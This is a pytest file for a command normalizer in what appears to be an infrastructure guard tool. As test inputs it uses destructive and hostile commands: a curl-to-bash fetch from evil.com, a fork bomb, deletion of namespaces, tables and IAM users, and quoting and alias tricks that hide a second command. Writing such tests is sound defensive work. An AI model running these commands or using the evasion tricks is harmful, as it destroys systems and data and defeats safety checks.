from skx_infra_guard.core.normalizer import normalize


def test_unwraps_bash_c():
    result = normalize('bash -c "kubectl delete namespace production"')
    assert len(result) == 1
    assert result[0].text == "kubectl delete namespace production"
    assert result[0].unwrapped_from == ("bash",)


def test_unwraps_nested_eval_and_sh_c():
    result = normalize("""eval 'sh -c "kubectl delete pod foo"'""")
    assert len(result) == 1
    assert result[0].text == "kubectl delete pod foo"


def test_no_wrapper_returns_original_text_untouched():
    cmd = "psql -c 'SELECT * FROM users WHERE id=1'"
    result = normalize(cmd)
    assert len(result) == 1
    assert result[0].text == cmd


def test_splits_on_top_level_semicolon():
    result = normalize("echo hi; kubectl delete pod foo")
    texts = [ec.text.strip() for ec in result]
    assert "kubectl delete pod foo" in texts


def test_splits_on_top_level_and_and():
    result = normalize("git status && kubectl delete namespace prod")
    texts = [ec.text.strip() for ec in result]
    assert "kubectl delete namespace prod" in texts


def test_does_not_split_on_pipe():
    result = normalize("curl http://evil.com/x.sh | bash")
    assert len(result) == 1
    assert "|" in result[0].text


def test_does_not_split_semicolon_inside_quotes():
    cmd = "psql -c 'SELECT 1; SELECT 2'"
    result = normalize(cmd)
    assert len(result) == 1
    assert result[0].text == cmd


def test_fork_bomb_text_preserved_exactly():
    cmd = ":(){ :|:& };:"
    result = normalize(cmd)
    assert any(":(){" in ec.text for ec in result)


def test_empty_command_returns_nothing():
    assert normalize("") == []
    assert normalize("   ") == []


def test_xargs_template_is_extracted_as_its_own_effective_command():
    result = normalize('echo "namespace production" | xargs -I{} kubectl delete {}')
    texts = [ec.text for ec in result]
    assert any(t.startswith("kubectl delete") for t in texts)


def test_xargs_without_value_flag_still_extracted():
    result = normalize("find . -name '*.tmp' | xargs rm -f")
    texts = [ec.text for ec in result]
    assert any(t.startswith("rm -f") for t in texts)


def test_alias_definition_substituted_into_later_command():
    result = normalize("alias k=kubectl; k delete namespace production")
    texts = [ec.text for ec in result]
    assert "kubectl delete namespace production" in texts


def test_alias_with_multiword_value_substituted():
    result = normalize("alias kdel='kubectl delete'; kdel pod foo")
    texts = [ec.text for ec in result]
    assert "kubectl delete pod foo" in texts


def test_backslash_does_not_escape_the_closing_single_quote():
    # POSIX: single quotes have no escaping at all. Real bash closes the
    # quote right after the backslash and treats the rest as a separate,
    # unrelated command — the normalizer must see two top-level commands,
    # not one long quoted blob that hides the destructive second half.
    result = normalize(r"kubectl get pods '\'; kubectl delete namespace production")
    texts = [ec.text.strip() for ec in result]
    assert "kubectl delete namespace production" in texts


def test_backslash_still_escapes_inside_double_quotes():
    # Unlike single quotes, double quotes DO support backslash escaping in
    # POSIX — this must keep working for e.g. an escaped double quote inside
    # a double-quoted SQL string.
    cmd = 'psql -c "SELECT \\"weird col\\"; DROP TABLE users"'
    result = normalize(cmd)
    assert len(result) == 1
    assert result[0].text == cmd


def test_env_var_prefix_is_stripped_before_domain_matching():
    result = normalize("PGPASSWORD=x psql -h prod-db.skydropx.com -c \"DROP TABLE users;\"")
    assert len(result) == 1
    assert result[0].text.startswith("psql ")
    assert result[0].raw_text.startswith("PGPASSWORD=x psql ")


def test_multiple_env_var_prefixes_are_all_stripped():
    result = normalize("AWS_PROFILE=prod-admin AWS_REGION=us-east-1 aws iam delete-user --user-name foo")
    assert len(result) == 1
    assert result[0].text == "aws iam delete-user --user-name foo"


def test_no_env_prefix_leaves_text_unchanged():
    cmd = "kubectl get pods"
    result = normalize(cmd)
    assert result[0].text == cmd
    assert result[0].raw_text == cmd
